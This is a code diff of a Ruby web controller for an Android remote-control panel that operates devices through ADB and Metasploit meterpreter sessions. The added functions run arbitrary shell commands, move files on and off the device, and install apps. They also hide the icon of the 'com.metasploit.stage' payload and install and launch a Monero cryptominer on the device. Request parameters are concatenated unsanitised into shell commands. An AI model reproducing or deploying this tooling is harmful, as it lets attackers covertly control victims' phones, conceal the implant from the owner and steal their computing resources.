@@ -124,7 +124,8 @@ def list_apps
     begin
         apps_type=params[:system_apps] == 'true' ? '-s' : '-u'
         if @@isAdbConnected
-            commandOutput=run_adb_command('shell "pm list packages"').split("\n")
+          apps_type = '-3' if apps_type == '-u'
+            commandOutput=run_adb_command('shell "pm list packages "' + apps_type).split("\n")
         else
             processCommand="app_list #{apps_type}"
             commandOutput=start_msf_process(processCommand)
@@ -142,14 +143,21 @@ end
 
 
 def upload_file
-  if @@isAdbConnected
-      commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 push #{params[:filePath]} /sdcard/`
-  else
-      processCommand='upload #{params[:filePath]}'
-      commandOutput=start_msf_process(processCommand)
-  end
-      respond_to do |format|
-      format.js { render "upload_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
+    begin
+        push_file=params[:push_file]
+        destination=params[:destination]
+        if @@isAdbConnected
+            commandOutput=run_adb_command('push ' + push_file + ' ' + destination).split("\n")
+        else
+            processCommand='upload ' + push_file + ' ' + destination
+            commandOutput=start_msf_process(processCommand)
+        end
+    rescue
+        puts "Error uploading file."
+        commandOutput=["Operation Failed"]
+    end
+    respond_to do |format|
+        format.js { render "upload_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
     end
 end
 
@@ -158,12 +166,15 @@ end
 
 
 def wake_lock
-  processCommand="wakelock -r"
-  commandOutput=start_msf_process(processCommand)
-  puts commandOutput
-
-  respond_to do |format|
-      format.js { render "wake_lock", :locals => {:commandOutput => commandOutput}  }
+    begin
+        processCommand="wakelock -w"
+        commandOutput=start_msf_process(processCommand)
+    rescue
+        puts "Error unlocking screen"
+        commandOutput="Operation Failed"
+    end
+    respond_to do |format|
+        format.js { render "wake_lock", :locals => {:commandOutput => commandOutput}  }
     end
 end
 
@@ -171,17 +182,22 @@ end
 
 
 def run_shell_command
-  if @@isAdbConnected
-      commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell ls`
-  else
-      start_msf_process("shell")
-      processCommand='#{params[:shellCommand]}'
-      commandOutput=start_msf_process(processCommand)
-      detach_session
+  begin
+      command=params[:command]
+      if @@isAdbConnected
+          commandOutput=run_adb_command('shell "' + command + '"').split("\n")
+      else
+          start_msf_process("shell")
+          commandOutput=start_msf_process(command)
+          detach_session
+      end
+  rescue
+      puts "Error running shell command."
+      commandOutput=["Operation Failed"]
   end
-      respond_to do |format|
+  respond_to do |format|
       format.js { render "run_shell_command", :locals => {:commandOutput => commandOutput.split('\n')}  }
-    end
+  end
 end
 
 
@@ -189,65 +205,139 @@ end
 
 
 def open_app
-  if @@isAdbConnected
-    commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 run #{params[:app_name]}`
-  else
-    processCommand="app_run #{params[:app_name]}"
-    commandOutput=start_msf_process(processCommand)
+    begin
+        app=params[:app]
+        if @@isAdbConnected
+          commandOutput=run_adb_command('shell "am start -n ' + app + '"').split("\n")
+        else
+          processCommand="app_run " + app
+          commandOutput=start_msf_process(processCommand)
+        end
+    rescue
+        puts "Error opening app."
+        commandOutput=["Operation Failed"]
+    end
+    respond_to do |format|
+        format.js { render "open_app", :locals => {:commandOutput => commandOutput}  }
+    end
 end
-respond_to do |format|
-    format.js { render "open_app", :locals => {:commandOutput => commandOutput}  }
-  end
-end
 
 
 
 
 
-def install_app
-  if @@isAdbConnected
-    commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 install #{params[:app_name]}`
-  else
-    processCommand="app_install #{params[:app_name]}"
-    commandOutput=start_msf_process(processCommand)
-end
-respond_to do |format|
-    format.js { render "install_app", :locals => {:commandOutput => commandOutput}  }
-  end
+def install_apk
+    begin
+        app=params[:app]
+        if @@isAdbConnected
+            commandOutput=run_adb_command('install ' + app).split("\n")
+        else
+            processCommand="app_install " + app
+            commandOutput=start_msf_process(processCommand)
+        end
+    rescue
+        puts "Error installing app."
+        commandOutput=["Operation Failed"]
+    end
+    respond_to do |format|
+        format.js { render "install_app", :locals => {:commandOutput => commandOutput}  }
+    end
 end
 
 
 
 
 def dump_device_info
-  if @@isAdbConnected
-    commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 shell getprop ro.product.model`
-  else
-    start_msf_process("shell")
-    processCommand='getprop ro.product.model'
-    commandOutput=start_msf_process(processCommand)
-    detach_session
-end
-respond_to do |format|
-    format.js { render "dump_device_info", :locals => {:commandOutput => commandOutput}  }
-  end
+    begin
+        if @@isAdbConnected
+            commandOutput=run_adb_command('shell "getprop ro.product.model"').split("\n")
+        else
+            start_msf_process("shell")
+            processCommand='getprop ro.product.model'
+            commandOutput=start_msf_process(processCommand)
+            detach_session
+        end
+    rescue
+        puts "Error dumping device info."
+        commandOutput=["Operation Failed"]
+    end
+    respond_to do |format|
+        format.js { render "dump_device_info", :locals => {:commandOutput => commandOutput}  }
+    end
 end
 
 
 
 
 def pull_file
-  if @@isAdbConnected
-      commandOutput=`tools\\platform-tools\\adb.exe -s 192.168.100.33 pull #{params[:filePath]} /sdcard/`
-  else
-      processCommand='pull #{params[:filePath]}'
-      commandOutput=start_msf_process(processCommand)
-  end
-      respond_to do |format|
-      format.js { render "upload_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
+    begin
+        pull_file=params[:pull_file]
+        destination=params[:destination]
+        if @@isAdbConnected
+            commandOutput=run_adb_command("pull " + pull_file + " " + destination).split("\n")
+        else
+            processCommand='pull ' + pull_file + " " + destination
+            commandOutput=start_msf_process(processCommand)
+        end
+    rescue
+        puts "Error pulling file."
+        commandOutput=["Operation Failed"]
+    end
+    respond_to do |format|
+        format.js { render "pull_file", :locals => {:commandOutput => commandOutput.split('\n')}  }
     end
 end
 
+
+
+
+
+def hide_app
+  begin
+      if @@isAdbConnected
+        run_adb_command('shell "pm hide com.metasploit.stage"')
+      else
+        processCommand="hide_app_icon"
+        start_msf_process(processCommand)
+      end
+      commandOutput=["App icon hidden."]
+  rescue
+      commandOutput=["Operation Failed"]
+      puts "Error hiding app icon."
+  end
+  respond_to do |format|
+      format.js { render "hide_app", :locals => {:commandOutput => commandOutput}  }
+  end
+end
+
+def show_app
+  begin
+      run_adb_command('shell "pm unhide com.metasploit.stage"')
+      commandOutput=["App icon unhidden."]
+  rescue
+      commandOutput=["Operation Failed"]
+      puts "Error unhiding app icon."
+  end
+  respond_to do |format|
+      format.js { render "show_app", :locals => {:commandOutput => commandOutput}  }
+  end
+end
+
+
+
+def crypto_minner
+  begin
+      run_adb_command('install tools\\platform-tools\\monero-miner.apk')
+      run_adb_command('shell "am start -n de.ludetis.monerominer/.MainActivity"')
+      commandOutput=["Started mining."]
+  rescue
+      commandOutput=["Operation Failed"]
+      puts "Error on crypto minner."
+  end
+  respond_to do |format|
+      format.js { render "crypto_minner", :locals => {:commandOutput => commandOutput}  }
+  end
+end
 
 
 
